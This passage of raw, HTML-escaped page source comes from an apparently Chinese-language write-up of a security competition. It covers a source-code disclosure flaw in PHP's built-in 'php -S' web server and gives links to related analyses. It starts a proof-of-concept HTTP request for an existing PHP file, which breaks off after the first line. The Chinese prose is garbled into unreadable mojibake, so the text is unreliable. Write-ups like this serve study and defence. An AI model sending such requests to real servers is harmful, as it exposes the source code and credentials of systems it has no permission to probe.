241030203712_hu_948e2e1614c8089a.png 2400w, https://t0mmy4.github.io/p/%E7%9C%81%E5%AD%A6%E4%BC%9A%E8%A1%8C%E4%B8%9A%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%9B%98/assets/pasted-image-20241030203712.png 2561w&#34; width=&#34;2561&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;php&#34;&gt;php&#xA;&lt;/h2&gt;&#xA;    &lt;blockquote&gt;&#xA;        &lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/Kawakaze777/p/17799235.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;&#xA;    &gt;https://www.cnblogs.com/Kawakaze777/p/17799235.html&lt;/a&gt;&#xA;&lt;a class=&#34;link&#34; href=&#34;https://blog.projectdiscovery.io/php-http-server-source-disclosure/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;&#xA;    &gt;https://blog.projectdiscovery.io/php-http-server-source-disclosure/&lt;/a&gt;&lt;/p&gt;&#xA;&#xA;    &lt;/blockquote&gt;&#xA;&lt;p&gt;еҲ©з”ЁдәҶиҝҷдёӘжјҸжҙһ&lt;/p&gt;&#xA;&lt;h3 id=&#34;жјҸжҙһжҲҗеӣ &#34;&gt;жјҸжҙһжҲҗеӣ &#xA;&lt;/h3&gt;&lt;p&gt;йҖҡиҝҮ&lt;code&gt;php -S&lt;/code&gt;ејҖиө·зҡ„еҶ…зҪ®WEBжңҚеҠЎеҷЁеӯҳеңЁжәҗз Ғжі„йңІжјҸжҙһпјҢеҸҜд»Ҙе°ҶPHPж–Үд»¶дҪңдёәйқҷжҖҒж–Үд»¶зӣҙжҺҘиҫ“еҮәжәҗз Ғ&lt;/p&gt;&#xA;&lt;p&gt;иҝҷйҮҢзӣҙжҺҘз»ҷеҮәPOC&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;&#xA;&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1&#xA;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2&#xA;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3&#xA;&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4&#xA;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&#xA;&lt;td class=&#34;lntd&#34;&gt;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET /phpinfo.php HTTP/1.1  //иҝҷйҮҢзҡ„phpinfo.phpеҝ…йЎ»жҳҜеӯҳеңЁзҡ„ж–Үд»¶пјҢд№ҹе°ұжҳҜиҰҒиҜ»еҸ–жәҗз Ғзҡ„ж–Үд»¶&#xA;&lt;/span&